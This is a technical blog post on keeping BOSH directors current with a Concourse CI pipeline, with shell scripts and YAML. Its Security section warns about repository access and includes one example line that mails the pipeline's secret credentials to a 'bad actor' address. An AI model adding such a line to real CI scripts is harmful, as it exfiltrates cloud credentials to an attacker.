<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Maintaining BOSH Directors with Concourse CI and bosh-deployment | Brian Cunnie's Technical Blog</title><meta name=keywords content><meta name=description content="&ldquo;BOSH deploys Concourse, and Concourse deploys BOSH&rdquo; —Cloud Foundry koan
A BOSH Director is a VM (virtual machine) orchestrator which is itself a VM. BOSH solves the problem of keeping its VMs&rsquo; applications (operating systems (stemcells) and releases) up-to-date with the command, bosh deploy; however, this begs the question, &ldquo;what keeps the BOSH Director itself up-to-date?&rdquo;. [Quis custodiet?]
We explore using Concourse, a Continuous Integration (CI) server, and bosh-deployment [Updating BOSH], in order to create a Concourse pipeline which updates, in turn, a BOSH director on AWS (Amazon Web Services), on Microsoft Azure, and GCP (Google Cloud Platform)."><meta name=author content="Brian Cunnie"><link rel=canonical href=https://blog.nono.io/post/bosh-deployed-with-concourse/><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://blog.nono.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.nono.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.nono.io/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.nono.io/apple-touch-icon.png><link rel=mask-icon href=https://blog.nono.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-0NJ11E527T"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-0NJ11E527T",{anonymize_ip:!1})}</script><meta property="og:title" content="Maintaining BOSH Directors with Concourse CI and bosh-deployment"><meta property="og:description" content="&ldquo;BOSH deploys Concourse, and Concourse deploys BOSH&rdquo; —Cloud Foundry koan
A BOSH Director is a VM (virtual machine) orchestrator which is itself a VM. BOSH solves the problem of keeping its VMs&rsquo; applications (operating systems (stemcells) and releases) up-to-date with the command, bosh deploy; however, this begs the question, &ldquo;what keeps the BOSH Director itself up-to-date?&rdquo;. [Quis custodiet?]
We explore using Concourse, a Continuous Integration (CI) server, and bosh-deployment [Updating BOSH], in order to create a Concourse pipeline which updates, in turn, a BOSH director on AWS (Amazon Web Services), on Microsoft Azure, and GCP (Google Cloud Platform)."><meta property="og:type" content="article"><meta property="og:url" content="https://blog.nono.io/post/bosh-deployed-with-concourse/"><meta property="og:image" content="https://nono.io/images/brian_cunnie_profile.jpg"><meta property="article:section" content="post"><meta property="article:published_time" content="2017-11-24T14:06:25+00:00"><meta property="article:modified_time" content="2017-11-24T14:06:25+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://nono.io/images/brian_cunnie_profile.jpg"><meta name=twitter:title content="Maintaining BOSH Directors with Concourse CI and bosh-deployment"><meta name=twitter:description content="&ldquo;BOSH deploys Concourse, and Concourse deploys BOSH&rdquo; —Cloud Foundry koan
A BOSH Director is a VM (virtual machine) orchestrator which is itself a VM. BOSH solves the problem of keeping its VMs&rsquo; applications (operating systems (stemcells) and releases) up-to-date with the command, bosh deploy; however, this begs the question, &ldquo;what keeps the BOSH Director itself up-to-date?&rdquo;. [Quis custodiet?]
We explore using Concourse, a Continuous Integration (CI) server, and bosh-deployment [Updating BOSH], in order to create a Concourse pipeline which updates, in turn, a BOSH director on AWS (Amazon Web Services), on Microsoft Azure, and GCP (Google Cloud Platform)."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.nono.io/post/"},{"@type":"ListItem","position":2,"name":"Maintaining BOSH Directors with Concourse CI and bosh-deployment","item":"https://blog.nono.io/post/bosh-deployed-with-concourse/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Maintaining BOSH Directors with Concourse CI and bosh-deployment","name":"Maintaining BOSH Directors with Concourse CI and bosh-deployment","description":"\u0026ldquo;BOSH deploys Concourse, and Concourse deploys BOSH\u0026rdquo; —Cloud Foundry koan\nA BOSH Director is a VM (virtual machine) orchestrator which is itself a VM. BOSH solves the problem of keeping its VMs\u0026rsquo; applications (operating systems (stemcells) and releases) up-to-date with the command, bosh deploy; however, this begs the question, \u0026ldquo;what keeps the BOSH Director itself up-to-date?\u0026rdquo;. [Quis custodiet?]\nWe explore using Concourse, a Continuous Integration (CI) server, and bosh-deployment [Updating BOSH], in order to create a Concourse pipeline which updates, in turn, a BOSH director on AWS (Amazon Web Services), on Microsoft Azure, and GCP (Google Cloud Platform).","keywords":[],"articleBody":"“BOSH deploys Concourse, and Concourse deploys BOSH” —Cloud Foundry koan\nA BOSH Director is a VM (virtual machine) orchestrator which is itself a VM. BOSH solves the problem of keeping its VMs’ applications (operating systems (stemcells) and releases) up-to-date with the command, bosh deploy; however, this begs the question, “what keeps the BOSH Director itself up-to-date?”. [Quis custodiet?]\nWe explore using Concourse, a Continuous Integration (CI) server, and bosh-deployment [Updating BOSH], in order to create a Concourse pipeline which updates, in turn, a BOSH director on AWS (Amazon Web Services), on Microsoft Azure, and GCP (Google Cloud Platform). Updating all three BOSH directors can be accomplished with a single click. [One click] Best of all, our directors are re-deployed with a recent stemcell, BOSH release, and CPI release. [How recent?]\n0. Overview Our Concourse pipeline is publicly-viewable, and can be seen at https://ci.nono.io/teams/main/pipelines/BOSH. It’s a straightforward pipeline which consists of three jobs, one for each director on each IaaS (Infrastructure as a Service): bosh-aws.nono.io, bosh-azure.nono.io, and bosh-gce.nono.io.\nBelow is a diagram of our Concourse configuration which describes the pipeline in greater detail. Note that we keep our credentials (e.g our AWS access key and secret) in LastPass (see items in red), but LastPass is not strictly necessary: credentials can be embedded directly in the BOSH manifests, can be passed as variables during the BOSH manifest creation, or can be maintained as files on the local hard drive.\n1. Concourse Tasks To build our Concourse pipeline, we begin with the the smallest configurable component, the Concourse task.\nThe Concourse task is often a set of Concourse resources (e.g GitHub repositories containing BOSH manifests), environment variables (e.g. ${IAAS} (the IaaS to which we’re deploying)), and perhaps most importantly, the shell script which deploys the director.\n1.0 Concourse Task Shell Script Here is our annotated shell script our Concourse tasks use to deploy our BOSH director:\n[Note: see next section, Simplify the Concourse Task, for a simpler task shell script; it’s a better starting point. We customize our BOSH directors in a manner which complicates our task shell script.]\n#!/bin/bash # We abort the script as soon as we hit an error (as soon as a command exits # with a non-zero exit status) set -e # `cunnie-deployments` is the checked-out GitHub repo that contains our BOSH # manifests and our directors' `-state.json` files; it also contains this # script (task script) and task definition. pushd cunnie-deployments # We invoke the script that generates our BOSH director's manifest, e.g. # `aws.sh`, `azure.sh`. The output, the BOSH director's manifest, is named # `bosh-$IAAS.yml`, e.g. `bosh-aws.yml` bin/$IAAS.sh # Does ${DEPLOYMENTS_YML} have a complete set of interpolated variables? # Abort if not (`--var-errs`). bosh int bosh-$IAAS.yml \\ --var-errs \\ -l \u003c(echo \"$DEPLOYMENTS_YML\") \\ -l \u003c(curl https://raw.githubusercontent.com/cunnie/sslip.io/master/conf/sslip.io%2Bnono.io.yml) \\ \u003e /dev/null # We attempt to deploy our BOSH director. We prepare a git commit message # regardless whether our attempt succeeds or fails because we need to retain any # change to the BOSH director's `-state.json` file. This is necessary in cases # where a deploy proceeds far enough to create a broken director VM, for # subsequent deploys must be able to destroy the broken director VM in order to # free up its IP address so that the current deploy will succeed. The crucial # information needed to destroy the broken director VM is its VM's ID, which is # recorded in the `-state.json` file. # Note that `set -e` does not trigger an abort if the command that returns a # non-zero exit code is the subject of an `if` block, i.e. `if bosh create-env`; # this gives us the breathing room to commit our results regardless of whether # `bosh create-env` succeeded or failed if bosh create-env bosh-$IAAS.yml \\ -l \u003c(echo \"$DEPLOYMENTS_YML\") \\ -l \u003c(curl https://raw.githubusercontent.com/cunnie/sslip.io/master/conf/sslip.io%2Bnono.io.yml); then GIT_COMMIT_MESSAGE=\"CI PASS: $IAAS BOSH deploy ✈️\" DEPLOY_EXIT_STATUS=0 else GIT_COMMIT_MESSAGE=\"CI FAIL: $IAAS BOSH deploy ✈️\" DEPLOY_EXIT_STATUS=1 fi # Do we need to commit anything? If a new director hasn't been deployed (most # often because there's been no change to the manifest, releases, or stemcell), # then we don't need to commit if ! git diff --quiet HEAD --; then # If we're in this block, then there has been a deployment. Let's set our # git author to avoid git's `*** Please tell me who you are.` error. git config --global user.name \"Concourse CI\" git config --global user.email brian.cunnie@gmail.com # We check out our branch's HEAD because Concourse's git-resource leaves us # in `detached HEAD` state. ${DEPLOYMENTS_BRANCH} is typically set to # `master`, but may be set to something else (usually while testing). git checkout $DEPLOYMENTS_BRANCH git add . git commit -m\"$GIT_COMMIT_MESSAGE\" fi popd # We copy our repo with its new commit to a new directory. The Concourse job, # after it finishes running this task, will push the new commit to GitHub. # Note that `cp -R` works as well as `rsync`; we use `rsync` by force of # habit. rsync -aH cunnie-deployments/ cunnie-deployments-with-state/ # We exit with the return code of `bosh create-env`; if the deploy failed, then # this Concourse task failed exit $DEPLOY_EXIT_STATUS For those interested in the scripts which generate the BOSH director manifests (e.g. aws.sh), they were covered in an earlier blog post. For links to the scripts and the manifests they generate, see the table below:\nIaaS Script Generated Manifest AWS aws.sh bosh-aws.yml Azure azure.sh bosh-azure.yml GCP gce.sh bosh-gce.yml 1.1 Simplify the Concourse Task Script Simplify the Concourse task script. Specifically, inline the bosh-${IAAS}.sh script, then collapse the two bosh interpolate commands into the singular bosh create-env command.\nStart with a simple Concourse task script. Really. Don’t use the task script we use, [Why so complicated?] , the one listed above. Instead, start with a simplified task script, like bosh-simple.sh. We have tested it; it successfully deploys a director.\n1.2 Concourse Task Configuration file Now that we have our task’s shell script, we turn our attention to our task’s (YAML) configuration file. It can be viewed on GitHub, and is displayed below, too:\n--- platform: linux image_resource: type: docker-image source: repository: cunnie/fedora-golang-bosh inputs: - name: cunnie-deployments - name: bosh-deployment outputs: - name: cunnie-deployments-with-state params: # vainly default branch to master, but it's always overridden from the pipeline DEPLOYMENTS_BRANCH: 'master' DEPLOYMENTS_YML: '' IAAS: '' run: path: cunnie-deployments/ci/tasks/bosh.sh Notes:\nimage_resource: We use a custom-built Docker image, cunnie/fedora-golang-bosh (https://hub.docker.com/r/cunnie/fedora-golang-bosh/~/dockerfile/); but you may choose to use your own Docker image; just be sure that the BOSH CLI is installed. Our image is fairly hefty (450 MB), for it has a rich set of tools available to us when we need to intercept the container to troubleshoot a build.\ninputs: We have two inputs: bosh-deployment, a git repo which contains the manifests and tools necessary to deploy a BOSH director (this is the canonical way to deploy a BOSH director), and cunnie-deployments, a git repo which contains our BOSH directors’ manifests and state files. Also, this repo contains the required Concourse task definition (ci/tasks/bosh.yml) and script (ci/tasks/bosh.sh).\noutputs: We have one output, cunnie-deployments-with-state, which is the same as the input, cunnie-deployments. Concourse prohibits an input from also being an output, so our script copies the contents of one to the other. cunnie-deployments-with-state includes the commits made by the task (in the case of a deploy, the state file and possibly the BOSH director’s manifest). This output is used by a subsequent step in the Concourse job which will push any git commits to GitHub (although this Concourse task may make git commits, it won’t push them — it leaves that responsibility to the Concourse job).\nparams: DEPLOYMENTS_BRANCH is almost always set to master; it refers to the branch in the cunnie-deployments repo. IAAS is either aws, azure, or gce. DEPLOYMENTS_YML is YAML-formatted and contains secrets needed to deploy; sample contents can be viewed in an earlier blog post.\n[Note: you may opt to bypass the task configuration file completely and embed the necessary information into pipeline.yml; here is an example of embedding the task configuration directly into the pipeline.]\n2. Concourse Jobs The Concourse job is straightforward:\nIt checks out the cunnie-deployments and bosh-deployment git repos It runs the task which deploys the BOSH director to the specified IaaS It pushes changes to the director manifest (bosh-${IAAS}.yml) and the director state (bosh-${IAAS}-state.json) to the cunnie-deployments repo regardless of whether the deploy succeeded or failed (i.e. the ensure directive) Here is the Concourse job definition which deploys the BOSH director to the AWS IaaS:\njobs: - name: bosh-aws.nono.io plan: - get: cunnie-deployments - get: bosh-deployment - task: deploy file: cunnie-deployments/ci/tasks/bosh.yml params: DEPLOYMENTS_BRANCH: master DEPLOYMENTS_YML: ((deployments_yml)) IAAS: aws ensure: put: cunnie-deployments params: repository: cunnie-deployments-with-state/ 3. Concourse Pipeline The full Concourse pipeline (pipeline.yml) can be seen here. Below is an abbreviated portion which shows the Concourse resources and the first job (which deploys the AWS BOSH director):\n# fly -t nono sp -p BOSH -c ~/workspace/deployments/ci/pipeline.yml -v github_deployments_key=\"$(lpass show --note github_deployments_key)\" -v deployments_yml=\"$(lpass show --note deployments.yml)\" jobs: - name: bosh-aws.nono.io plan: - get: cunnie-deployments - get: bosh-deployment - task: deploy file: cunnie-deployments/ci/tasks/bosh.yml params: DEPLOYMENTS_BRANCH: master DEPLOYMENTS_YML: ((deployments_yml)) IAAS: aws ensure: put: cunnie-deployments params: repository: cunnie-deployments-with-state/ # Other jobs redacted for brevity resources: - name: cunnie-deployments type: git source: uri: git@github.com:cunnie/deployments.git private_key: ((github_deployments_key)) branch: master - name: bosh-deployment type: git source: uri: https://github.com/cloudfoundry/bosh-deployment.git Notes:\nThe first line is a convenience comment; it shows the fly (Concourse CLI) command which updates the Concourse server’s pipeline after changes have been made to the pipeline.yml file. We cut-and-paste that comment into our shell whenever we make a change to pipeline.yml in order to propagate the changes to the pipeline to our Concourse server:\nfly -t nono sp -p BOSH -c ~/workspace/deployments/ci/pipeline.yml -v github_deployments_key=\"$(lpass show --note github_deployments_key)\" -v deployments_yml=\"$(lpass show --note deployments.yml)\" We have already discussed deployments_yml (i.e. the Concourse task environment variable/parameter DEPLOYMENTS_YML), but the other variable, github_deployments_key, warrants discussion. It is a GitHub deploy key which allows our job to push changes to the cunnie-deployments repo [Interpolation] .\nWe’d like to discuss how we stop the pipeline when the deploy of a BOSH director fails. We use Concourse’s passed directive. For example, if our deploy of the AWS director fails, we do not want to deploy the Azure director.\nThe following shows the diff between the job to deploy the AWS director and the job to deploy Azure director. Pay special attention to the passed and trigger directives: the deploy of the Azure director is kicked off if and only if there has been a successful deploy of the AWS director. This limits the damage caused by a flawed configuration: only one director is knocked offline (typically the first one, AWS), not all three.\n-- name: bosh-aws.nono.io +- name: bosh-azure.nono.io plan: - get: cunnie-deployments + passed: [ bosh-aws.nono.io ] + trigger: true - get: bosh-deployment + passed: [ bosh-aws.nono.io ] + trigger: true - task: deploy file: cunnie-deployments/ci/tasks/bosh.yml params: DEPLOYMENTS_BRANCH: master DEPLOYMENTS_YML: ((deployments_yml)) - IAAS: aws + IAAS: azure ensure: put: cunnie-deployments params: 4. Security Restrict your Concourse teams to people you trust, don’t unnecessarily expose your pipelines or publish your pipelines’ configurations (.yml files). Similarly, restrict access to your GitHub repo which has your director manifests and Concourse scripts.\nOur credentials are stored in our Concourse pipeline, and they can be easily revealed by a trusted user with the following command:\nfly -t nono get-pipeline -p BOSH These credentials include IaaS credentials, which will allow a bad actor to spin up multiple VMs to run, say, Bitcoin mining. A co-worker of the author whose credentials were compromised had unauthorized AWS charges exceeding $3k.\nIt is also important to restrict access to the GitHub repo which contains the scripts that are run. Although the repo does not contain credentials, it enables the execution of commands which can reveal the credentials. For example, the following line of code could be added to the ci/tasks/bosh.sh script to email the credentials to the bad actor:\necho ${DEPLOYMENTS_YML} | mail -s \"secret credentials\" bad.actor@mailinator.com Footnotes [Quis custodiet?] “Who updates the VM [BOSH director] that keeps the other VMs updated?” is the question, versions of which have been asked as long ago as the days of the Roman poet Juvenal, who famously asked, “Quis custodiet ipsos custodes?” and as recently as this century by comic book writer Alan Moore, who phrased it, “Who watches the Watchmen?”\n[How recent?] How fresh is bosh-deployment? Fresh. bosh-deployment is a quite active git repo, typically updated several times or more each week. It’s the tool that the BOSH team, and many Cloud Foundry teams, use to keep their BOSH directors current.\n[Updating BOSH] In the early days, the BOSH micro plugin was the mechanism to update the BOSH director. There were several drawbacks to the micro plugin, one of which is that it forced the BOSH CLI to have an understanding of the API for various IaaSes, breaking the Cloud Layer abstraction model.\nAnother drawback of the BOSH micro plugin was that it was brittle, so much so that it was a common pattern to deploy a BOSH director whose sole purpose was to deploy the “real” BOSH director. “Ha!” one might ask, “But how did you keep that first BOSH director up-to-date?” The answer is simple: you didn’t. You left that first BOSH director running and never touched it except to redeploy the “real” BOSH director. You might spin it down if you weren’t using it, but you never deleted it or updated it.\nThese were serious problems, and to address them the BOSH Core team wrote bosh-init, a Golang-based executable whose purpose was to deploy BOSH directors. It adhered to the Cloud Layer abstraction models (it used the existing CPIs (Cloud Provider Interfaces) for the existing IaaSes (VMware vSphere, Google Cloud Platform (GCP), OpenStack, Microsoft Azure, among others)).\nBy April 30, 2015, bosh-init was production-ready, and the BOSH documentation was updated to reflect the new world order.\nBut all was not perfect in the Garden of Eden, for the introduction of bosh-init split the CLIs: whereas before there was one BOSH CLI, now there were two: bosh, the original Ruby-based CLI for managing a BOSH director’s deployment, and bosh-init for deploying a BOSH director itself. In many ways this resembled the Western Schism, a dark chapter in the Roman Catholic church when there were two popes (who had the terrible habit of excommunicating each other). The BOSH development team remedied this situation by creating a third CLI, the Golang-based CLI. In this regard, the BOSH development team’s approach mirrored the approach attempted by the Catholic cardinals, who elected a third pope. The BOSH team’s approach succeeded, but the cardinals’ didn’t (they were left with three popes running around excommunicating each other).\n[One click] It’s technically possible to kick off the builds with zero clicks — to kick off the build automatically if, say, a commit is pushed to the bosh-deployment repository. The modification to the pipeline is trivial:\n- name: bosh-aws.nono.io plan: - get: cunnie-deployments - get: bosh-deployment + trigger: true - task: deploy However, the decision to trigger automatically is not without risks: the BOSH director may be in the middle of a delicate task, such as updating a deployment, and won’t have the opportunity to gracefully bring itself down, forbosh create-env is relentless, brooks no delays, and gives no quarter.\nOn a more technical note, bosh create-env, although it will attempt to contact the BOSH agent on the original BOSH director in order to terminate the jobs and shut down the VM, it does not run the drain scripts (scripts which allow the BOSH jobs to clean up and get into a state where they can be safely stopped).\nThere is discussion within the BOSH development team whether to modify the behavior of bosh create-env to make it run the drain scripts. On the positive side, it will allow a more cavalier approach to re-deploying the director, and make the behavior of bosh create-env more closely approximate the behavior of a BOSH director. On the downside, the time to deploy a BOSH director may vary widely, dependent on the time it takes for the drain scripts to complete.\n[Interpolation] Our GitHub deploy key resembles the following (not our real key) [Elliptic-curve] :\n-----BEGIN EC PRIVATE KEY----- MHcCAQEEIMxcR2wlxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxqY/VyDTL AwEHoUQDQgAEmBUxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxjY98wOPVZ Ayz++1vHXODWeiC/CjNu7hOVaB682ZZfCw== -----END EC PRIVATE KEY----- Concourse, when passed the flag ... -v github_deployments_key=\"$(lpass show --note github_deployments_key)\" will interpolate this section of pipeline.yml:\ntype: git source: uri: git@github.com:cunnie/deployments.git private_key: ((github_deployments_key)) After interpolation, the pipeline looks like this:\n- name: cunnie-deployments type: git source: uri: git@github.com:cunnie/deployments.git # previously: private_key: ((github_deployments_key)) private_key: | -----BEGIN EC PRIVATE KEY----- MHcCAQEEIMxcR2wlxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxqY/VyDTL AwEHoUQDQgAEmBUxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxjY98wOPVZ Ayz++1vHXODWeiC/CjNu7hOVaB682ZZfCw== -----END EC PRIVATE KEY----- If your pipeline is not public, it may be easier to skip variable interpolation and embed the credential(s) directly.\n[Why so complicated?] Our Concourse task is complicated (i.e. bosh.sh calls bosh-${IAAS}.sh, calls bosh CLI three times) because we have requirements beyond merely deploying a BOSH director:\nWe retain intermediate BOSH manifests (e.g. bosh-aws.yml, manifests that are completely populated with the exception of the secrets (passwords, credentials, private keys). The sole purpose of the first bosh interpolate commands is to generate the intermediate manifest. We realize that our love of the intermediate manifests is not wholly rational: time was when a working BOSH manifest was a precious thing, something to tend to and to preserve. With the advent of bosh-deployment, which reliably generates BOSH manifests, the intermediate manifests have diminished in importance, and are now merely artifacts of a bygone age. And yet we still cling to them, for they provide a sense of comfort, like a mother’s hot apple pie.\nWe prefer to set our own passwords rather than use the ones auto-generated [auto-passwords] by the BOSH CLI. This has two implications:\nIt forces us to set the password variables in a counter-intuitive manner (e.g. bosh interpolate ... -v admin_password='((admin_password))' ...) (which says, in effect, “replace all occurrences of ‘((admin_password))’ with ‘((admin_password))’.”), which prevents the BOSH CLI from using its auto-generated passwords and paves the way to subsequently interpolate our passwords. This adds several lines to our scripts.\nIt forces us to check to make sure that we haven’t overlooked any variables (i.e. we run bosh interpolate --var-errs ...), so that, for example, our director’s password is set to IReturnedAndSawUnderTheSun and not ((admin_password))). This adds several more lines to our scripts.\nOur BOSH director uses certificates issued by a recognized CA (Certificate Authority) (in our case, Comodo). This requires us to create a manifest operations file (e.g. etc/aws.yml) which we pass to bosh interpolate which overrides the auto-generated SSL certificate \u0026 key with our certificate \u0026 key.\nSome of our BOSH directors (e.g. bosh-aws.nono.io) are more than mere BOSH directors — they are also nginx servers (web servers), DNS (Domain Name System) servers, and NTP (Network Time Protocol) servers. This adds three more lines to our scripts.\nNote: one advantage of using CA-issued certificates and easy-to-remember passwords is that it enables one to reach the BOSH director via the CLI without needing the creds.yml file — one can sit at a new workstation, type bosh -e bosh-gce.nono.io login, and proceed to manage deployments, releases, stemcells, etc….\n[auto-passwords] The BOSH CLI generates high-entropy passwords when --vars-store flag is passed.\nHere is a list of sample passwords that bosh create-env --vars-store=... creates:\nadmin_password: qn7hc6zsq0nphhsvojx3 blobstore_agent_password: iut5wdyeo5kkhvqoerj0 blobstore_director_password: wm0qgnzdwgy8k1hnm4nq hm_password: plk829eob45khq6o9dl5 mbus_bootstrap_password: nf16h5e9j120uqp35hlr nats_password: gr4s0xmj4s5iccqv69dt postgres_password: 7nxuq714hxcta513778g registry_password: ffxnhu4xtgh7lsxu7xpl Note that the passwords are 20 bytes long and consist of random sequence of numbers and lowercase letters. Each byte can be one of 36 possibilites (10 numbers plus 26 letters). Given that there are 20 bytes, the total number of combinations is 3620, 1.33 x 1031, effectively rendering the password immune to a brute-force attack (even if you could make a million attempts every second, it would still require 4 × 1017 years to exhaust all combinations. In other words, you’d crack the password long after the Stelliferous Era ended and you were well into the Degenerate Era).\n[Elliptic-curve]We use elliptic-curve cryptography (ECC) keys, for they are much shorter than an RSA key of equivalent strength, and thus more manageable. Unfortunately, they are not universally accepted (e.g. AWS will respond with “Error importing Key Pair Key is not in valid OpenSSH public key format” when importing an EC public key).\nWhere elliptic-curve cryptography is concerned, GitHub is ahead of the proverbial curve, and AWS, behind.\nCorrections \u0026 Updates 2017-12-01\nWe suggest simplifying the Concourse task script. The Concourse task script executes the BOSH CLI three times (bosh int twice and bosh create-env once), but need only execute it once (bosh create-env) when intermediate artifacts aren’t desired.\n2017-11-25\nDavid McClure pointed out that the OpenStack link was missing; it has been added. Thanks, David.\n","wordCount":"3444","inLanguage":"en","datePublished":"2017-11-24T14:06:25Z","dateModified":"2017-11-24T14:06:25Z","author":{"@type":"Person","name":"Brian Cunnie"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.nono.io/post/bosh-deployed-with-concourse/"},"publisher":{"@type":"Organization","name":"Brian Cunnie's Technical Blog","logo":{"@type":"ImageObject","url":"https://blog.nono.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.nono.io/ accesskey=h title="Brian Cunnie's Technical Blog (Alt + H)">Brian Cunnie's Technical Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://blog.nono.io/>Home</a>&nbsp;»&nbsp;<a href=https://blog.nono.io/post/>Posts</a></div><h1 class=post-title>Maintaining BOSH Directors with Concourse CI and bosh-deployment</h1><div class=post-meta><span title='2017-11-24 14:06:25 +0000 UTC'>November 24, 2017</span>&nbsp;·&nbsp;17 min&nbsp;·&nbsp;Brian Cunnie&nbsp;|&nbsp;<a href=https://github.com/cunnie/cunnie.github.io/tree/master/content/post/bosh-deployed-with-concourse.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><p><em>&ldquo;BOSH deploys Concourse, and Concourse deploys BOSH&rdquo; —Cloud Foundry koan</em></p><p>A BOSH Director is a VM (virtual machine) orchestrator which is itself a VM.
BOSH solves the problem of keeping its VMs&rsquo; applications (operating systems
(stemcells) and releases) up-to-date with the command, <code>bosh deploy</code>; however,
this begs the question, &ldquo;what keeps the BOSH Director itself up-to-date?&rdquo;.
<sup><a href=#quis class=alert-link>[Quis custodiet?]</a></sup></p><p>We explore using <a href=https://concourse.ci/>Concourse</a>, a Continuous Integration
(CI) server, and
<a href=https://github.com/cloudfoundry/bosh-deployment/>bosh-deployment</a> <sup><a href=#bosh_up_to_date class=alert-link>[Updating BOSH]</a></sup>, in order
to create a <a href=https://github.com/cloudfoundry/bosh-deployment/>Concourse
pipeline</a> which updates, in
turn, a BOSH director on AWS (Amazon Web Services), on Microsoft Azure, and GCP
(Google Cloud Platform). Updating all three BOSH directors can be accomplished
with a single click. <sup><a href=#one_click class=alert-link>[One
click]</a></sup> Best of all, our directors are re-deployed with a recent
stemcell, BOSH release, and CPI release. <sup><a href=#how_recent class=alert-link>[How recent?]</a></sup></p><h2 id=0-overview>0. Overview<a hidden class=anchor aria-hidden=true href=#0-overview>#</a></h2><p>Our Concourse pipeline is publicly-viewable, and can be seen at
<a href=https://ci.nono.io/teams/main/pipelines/BOSH>https://ci.nono.io/teams/main/pipelines/BOSH</a>. It&rsquo;s a straightforward pipeline
which consists of three jobs, one for each director on each IaaS (Infrastructure
as a Service): bosh-aws.nono.io, bosh-azure.nono.io, and bosh-gce.nono.io.</p><figure><img loading=lazy src=https://user-images.githubusercontent.com/1020675/31297994-0405c082-aa9d-11e7-9669-b8f08852d286.png></figure><p>Below is a diagram of our Concourse configuration which describes the pipeline
in greater detail. Note that we keep our credentials (e.g our AWS access key and
secret) in LastPass (see items in red), but LastPass is not strictly necessary:
credentials can be embedded directly in the BOSH manifests, can be passed as
variables during the BOSH manifest creation, or can be maintained as files on
the local hard drive.</p><figure><img loading=lazy src="https://docs.google.com/drawings/d/e/2PACX-1vTXkKXrmPKiLkU2AwIiDWtA5FDun6u8TvGN49SbZ1jlsRScOyQT_B4sInIryzCveyK3-ia1DjSyvFLT/pub?w=1224&h=1584"></figure><h2 id=1-concourse-tasks>1. Concourse Tasks<a hidden class=anchor aria-hidden=true href=#1-concourse-tasks>#</a></h2><p>To build our Concourse pipeline, we begin with the the smallest configurable
component, the Concourse <a href=https://concourse.ci/running-tasks.html>task</a>.</p><p>The Concourse task is often a set of Concourse resources (e.g GitHub
repositories containing BOSH manifests), environment variables (e.g. <code>${IAAS}</code>
(the IaaS to which we&rsquo;re deploying)), and perhaps most importantly, the shell
script which deploys the director.</p><h3 id=10-concourse-task-shell-script>1.0 Concourse Task Shell Script<a hidden class=anchor aria-hidden=true href=#10-concourse-task-shell-script>#</a></h3><p>Here is our annotated <a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/ci/tasks/bosh.sh>shell
script</a>
our Concourse tasks use to deploy our BOSH director:</p><p><em>[Note: see next section, <a href=#simpler>Simplify the Concourse Task</a>, for a simpler
task shell script; it&rsquo;s a better starting point. We customize our BOSH directors
